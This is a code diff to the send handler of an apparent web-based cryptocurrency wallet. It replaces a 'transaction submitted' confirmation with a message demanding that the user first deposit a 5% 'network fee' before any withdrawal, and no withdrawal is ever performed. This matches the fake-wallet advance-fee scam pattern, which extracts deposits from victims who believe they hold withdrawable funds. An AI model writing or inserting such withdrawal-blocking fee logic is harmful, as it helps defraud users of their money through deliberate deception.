@@ -574,12 +574,29 @@ sendSubmitBtn.addEventListener('click', () => {
         return;
     }
 
-    alert(`Sending ${amount} ${currency} to ${address}...\n\nTransaction submitted!`);
-    actionModal.classList.remove('show');
+    // Calculate network fee (5% of withdrawal amount)
+    const withdrawalAmount = parseFloat(amount);
+    const networkFee = withdrawalAmount * 0.05;
 
-    // Clear form
-    document.getElementById('send-address').value = '';
-    document.getElementById('send-amount').value = '';
+    // Show deposit requirement message inside the wallet
+    const sendMessage = document.getElementById('send-message');
+    sendMessage.textContent = `To withdraw $${withdrawalAmount.toFixed(2)} ${currency}, you need to deposit a network fee of $${networkFee.toFixed(2)} first.`;
+    sendMessage.style.display = 'block';
+
+    // Show OK button
+    const sendMessageOk = document.getElementById('send-message-ok');
+    sendMessageOk.style.display = 'block';
+
+    // Handle OK button click
+    const sendOkBtn = document.getElementById('send-ok-btn');
+    sendOkBtn.onclick = () => {
+        actionModal.classList.remove('show');
+        // Clear form
+        document.getElementById('send-address').value = '';
+        document.getElementById('send-amount').value = '';
+        sendMessage.style.display = 'none';
+        sendMessageOk.style.display = 'none';
+    };
 });
 
 // Wallet addresses for different coins
